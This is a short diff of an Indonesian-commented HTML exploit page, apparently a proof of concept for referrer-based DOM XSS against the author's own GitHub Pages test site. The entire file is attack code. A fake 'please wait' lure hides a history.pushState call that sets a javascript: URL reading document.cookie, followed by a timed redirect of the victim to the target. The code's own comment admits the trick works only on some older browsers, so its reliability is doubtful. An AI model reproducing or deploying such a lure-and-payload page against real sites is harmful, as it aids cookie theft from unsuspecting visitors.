@@ -1,8 +1,24 @@
-<script>
-// Ini valid karena dijalankan di evil.com dan mengubah URL ke skema javascript di domain yang sama (pada browser tertentu/lama)
-history.pushState({}, '', "javascript:alert(document.cookie)"); 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Penyerang (Exploit)</title>
+</head>
+<body>
+    <h1>Memproses... Mohon Tunggu</h1>
+    <p>Situs ini sedang mengarahkan Anda ke halaman tujuan.</p>
 
-// Setelah itu baru lakukan pengalihan ke situs target korban
-window.location = "https://cyberrgen002.github.io/tes-referer/";
+    <script>
+        // 1. Manipulasi URL di kolom alamat domain penyerang menjadi payload XSS
+        // Hal ini membuat browser mencatat payload tersebut ke dalam history/referrer
+        const payload = "javascript:alert('Kena DOM XSS! Cookie Anda: ' + document.cookie)";
+        history.pushState({}, '', payload);
 
-  </script>
+        // 2. Alihkan korban ke halaman target yang rentan di GitHub Pages Anda
+        setTimeout(() => {
+            window.location.href = "https://cyberrgen002.github.io/tes-referer/";
+        }, 1000);
+    </script>
+</body>
+</html>
